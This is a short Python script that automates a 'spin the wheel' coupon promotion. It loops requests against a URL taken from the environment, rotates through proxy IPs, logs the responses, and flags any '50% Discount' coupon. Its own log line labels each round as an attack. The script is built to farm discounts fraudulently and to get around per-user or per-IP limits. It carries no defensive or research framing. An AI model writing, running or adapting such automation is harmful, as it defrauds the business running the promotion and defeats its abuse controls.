import requests
import json
import find_proxy
import random
from  time import sleep
from pwn import *
import string
from dotenv import load_dotenv
from headers import create_header
from set_payload import set_payload
from connection import start_to_connect
load_dotenv()
# Two steps
# Step 1: Spin the wheel and get the coupon
# Step 2: Check the coupon to see if it's 50% discount
url = f"{os.environ['URL']}"
headers = create_header()
# print(headers)
# Get proxy servers IPs
proxy_ips = find_proxy.get_proxy_ip()
# print(proxy_ips)
def main():
    while True:
        data = {}
        data = set_payload()
        try:
            info("Start attack: ")
            r = start_to_connect(url, headers, data, proxy_ips)
            info("Get responses: ")
            response = r.text
            print(response)
            # Don't log the message larger than 1000 characters
            if len(response) < 1000:
                with open("discount.txt", "a") as target:
                    target.write(response + "\n")
            if "50% Discount" in response:
                print("Got Good luck!!")
                print(response)
        except:
            pass
main()